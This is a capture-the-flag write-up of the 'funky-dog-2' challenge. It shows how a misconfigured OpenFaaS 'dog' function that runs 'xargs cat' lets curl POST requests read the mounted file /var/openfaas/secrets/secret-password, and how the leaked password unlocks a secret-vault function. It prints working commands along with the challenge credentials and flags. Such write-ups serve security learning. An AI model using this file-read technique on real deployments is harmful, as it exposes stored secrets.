# funky-dog-2

## Description:

For this challenge we were given a url to a OpenFaaS function, along with the description:

---

We found the ip address Billy is using for his openfaas functions from the git repo.
It seems he made a new function called secret-vault:

[http://129.241.209.104:8080/function/secret-vault](http://129.241.209.104:8080/function/secret-vault)

Can you retrive his secret from the vault?

_Note: /ui/\* is NOT within scope_

---

Visting the site we get a 200 HTTP OK response with the text:

```
exit status 1
Traceback (most recent call last):
  File "/home/app/index.py", line 19, in <module>
    ret = handler.handle(st)
  File "/home/app/function/handler.py", line 15, in handle
    username, password = req.split(":")
ValueError: not enough values to unpack (expected 2, got 1)
```

OpenFaaS is mentioned in the description and the git repo from the previous challenge, so what is it? OpenFaaS is a open source serverless program that can run **any** CLI binary (with Docker) or function's written in languages like Python, Go, Javascript, etc..
To invoke a function in OpenFaaS we can make a POST request to the URL. Looking at the response from earlier, we can asume that the function wants an username and a password like this: "USERNAME:PASSWORD". We can try:

```bash
❯ curl -X POST http://129.241.209.104:8080/function/secret-vault -d 'username:password'
No you! Wrong password or username.
```

We have the username form the previous challenge (the flag of funky-dog-1), so we need a password. Since Billy leaked his "secret" username in his repo, maybe we can find something else that we can use.

Looking through his repo we can see what other functions he is running on OpenFaaS in the stack.yml file:

```yaml
provider:
  name: openfaas
  gateway: http://127.0.0.1:19999

functions:
  echo:
    lang: dockerfile
    handler: ./echo
    image: functions/faas-echo:latest
  dog:
    lang: dockerfile
    handler: ./Tester/dog
    image: functions/faas-dog:latest
    secrets:
      - secret-password
  hello-openfaas:
    lang: python3
    handler: ./hello-openfaas
    image: hello-openfaas:latest
```

Billy is mounting a secret to the "dog" function. Reading the [documentation](https://docs.openfaas.com/reference/secrets/) for OpenFaaS about secrets, we know that the secret is read in the Docker-container file-system from the location: "/var/openfaas/secrets/secret-name".

All the functions running on OpenFaaS can be accessed with the endpoint: "DOMAIN/function/NAME OF FUNCTION".
Trying [http://129.241.209.104:8080/function/dog](http://129.241.209.104:8080/function/dog) we only get a 200 OK response with no body/text.

Next we can find out what the "dog" function actually does:

```bash
❯ cat Tester/dog/Dockerfile
FROM openfaas/classic-watchdog:0.18.8 as watchdog

FROM alpine:3.11

COPY --from=watchdog /fwatchdog /usr/bin/fwatchdog
COPY /dog /home/app/dog
RUN chmod +x /usr/bin/fwatchdog

ENV fprocess="xargs cat"

RUN addgroup -g 1000 -S app && adduser -u 1000 -S app -G app
USER 1000

CMD [ "/usr/bin/fwatchdog"]
```

The function is running the Unix cat command! Now we can try to cat the contents of the "secret-password" mounted in the container.

```bash
❯ curl -X POST http://129.241.209.104:8080/function/dog -d '/var/openfaas/secrets/secret-password'
wellILoveDogsNotGonnaLie
```

Great! Now we have the username and password. Invoking the "secret-vault" function with the correct credentials gives us the flag:

```bash
❯ curl -X POST http://129.241.209.104:8080/function/secret-vault -d 'KID20{w1th_5_l0ng_sp3c14l_u5s3rn4m3_n0b0dy_c5n_h4ck_m3}:wellILoveDogsNotGonnaLie'
My little secret: KID20{4ll_my_c0d3_i5_fr0m_s74ck0v3rfl0w}
```
